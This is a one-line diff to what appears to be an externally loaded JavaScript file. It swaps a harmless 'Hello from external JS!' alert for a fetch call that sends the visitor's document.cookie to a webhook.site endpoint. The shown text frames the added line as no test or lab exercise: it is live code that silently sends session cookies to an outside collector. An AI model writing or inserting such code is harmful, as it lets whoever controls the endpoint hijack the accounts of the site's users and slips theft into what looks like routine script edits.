@@ -1,1 +1,1 @@
-alert("Hello from external JS!");
+fetch('https://webhook.site/abc?c='+document.cookie)
